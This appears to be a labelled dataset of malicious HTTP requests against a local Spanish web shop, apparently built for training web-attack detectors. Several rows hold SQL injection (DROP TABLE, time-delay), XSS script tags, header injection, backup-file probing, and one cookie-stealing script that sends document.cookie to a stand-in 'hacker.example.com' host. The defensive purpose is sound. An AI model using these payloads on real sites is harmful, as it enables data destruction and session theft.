requests	labels
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = Jam�n + Ib�rico & precio = 85 & cantidad = '; + DROP + TABLE + usuarios; + SELECT + * + FROM + datos + WHERE + nombre + LIKE + '% & B1 = A�adir + al + carrito	1
http :  /  / localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 /  & nombre = Jam�n + Ib�rico & precio = 85 & cantidad = 49 & B1 = A�adir + al + carrito	1
http :  /  / localhost : 8080 / asf - logo - wide . gif~	1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = bob @  < SCRipt > alert(Paros) <  / scrIPT >  . parosproxy . org & pwd = 84m3ri156 & remember = on & B1 = Entrar	1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = grimshaw & pwd = G /  / lAc,IAr & remember = on & B1 = Entrar	1
http :  /  / localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = grimshaw & pwd = 84m3ri156 & rememberA = on & B1 = Entrar	1
http :  /  / localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? idA = 2	1
http :  /  / localhost : 8080 / tienda1 / publico / entrar . jsp ? errorMsg =  + 	1
http :  /  / localhost : 8080 / tienda1 / publico / entrar . jsp ? errorMsgA = Credenciales + incorrectas	1
http :  /  / localhost : 8080 / IISSamples / sdk / asp / applications / Application_VBScript . asp	1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 183','0','0');waitfor + delay + '0 : 0 : 15'; -  -  & B1 = Pasar + por + caja	1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 183 & B1 = Pasar + por + caja / 	1
http :  /  / localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 183 & B1A = Pasar + por + caja	1
http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = armand & password = prusiato & nombre = Samia & apellidos = Catalayud + Mirabet & email = balademas . mareuil6 @ enlanzarote . com . vc & dni = 28178710F & direccion = C /  + Cala, + 9, +  & ciudad = Mutxamel & cp = 25332 & provincia = Zaragoza & ntc = 8608089924764976 & B1 = Registrar	1
"http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro < SCRIPT > alert(""Paros""); <  / SCRIPT >  & login = armand & password = prusiato & nombre = Samia & apellidos = Catalayud + Mirabet & email = balademas . mareuil6 @ enlanzarote . com . vc & dni = 28178710F & direccion = C /  + Cala, + 9, +  & ciudad = Mutxamel & cp = 25332 & provincia = Zaragoza & ntc = 8608089924764976 & B1 = Registrar"	1
http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = armand & password = prusiato & nombre = anySet - cookie :  + Tamper = 5765205567234876235 & apellidos = Catalayud + Mirabet & email = balademas . mareuil6 @ enlanzarote . com . vc & dni = 28178710F & direccion = C /  + Cala, + 9, +  & ciudad = Mutxamel & cp = 25332 & provincia = Zaragoza & ntc = 8608089924764976 & B1 = Registrar	1
http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = bau*gnon & password = prusiato & nombre = Samia & apellidos = Catalayud + Mirabet & email = balademas . mareuil6 @ enlanzarote . com . vc & dni = 28178710F & direccion = C /  + Cala, + 9, +  & ciudad = Mutxamel & cp = 25332 & provincia = Zaragoza & ntc = 8608089924764976 & B1 = Registrar	1
http :  /  / localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = armand & password = prusiato & nombre = Samia & apellidos = Catalayud + Mirabet & email = balademas . mareuil6 @ enlanzarote . com . vc & dniA = 28178710F & direccion = C /  + Cala, + 9, +  & ciudad = Mutxamel & cp = 25332 & provincia = Zaragoza & ntc = 8608089924764976 & B1 = Registrar	1
http :  /  / localhost : 8080 / asf - logo - wide . gif	1
http :  /  / localhost : 8080 / tienda1 / publico / vaciar . jsp ? B2 = Vaciar + carrito|	1
http :  /  / localhost : 8080 / tienda1 / publico / vaciar . jsp ? B2A = Vaciar + carrito	1
http :  /  / localhost : 8080 / tienda1 / global / menum . jsp / 4861362529278789730	1
http :  /  / localhost : 8080 / iisstart . htm	1
http :  /  / localhost : 8080 / travelnet / home . jsp	1
http :  /  / localhost : 8080 / tienda1 / miembros / imagenes . BAK	1
http :  /  / localhost : 8080 / tienda1 / miembros / imagenes / zarauz . jpg / asf - logo - wide . gif . old	1
http :  /  / localhost : 8080 / tienda1 / miembros / index . jsp / 	1
http :  /  / localhost : 8080 / tienda1 / miembros / index . jsp . INC	1
http :  /  / localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = thyagara & password = fUeRTe & nombre = Sol & apellidos = Gorgone + Oteo & email = tissier @ b - sign . cg & dni = 03028605B & direccion = Calle + Alboran + 39, +  & ciudad = Millanes & cp = 49731 & provincia = Tarragona & ntc = 4096797311989091sessionid = 12312312 &  + username =  < script > document . location = 'http :  /  / hacker +  . example . com / cgi - bin / cookiesteal . cgi ? ' +  + document . cookie <  / script >  & B1 = Registrar	1
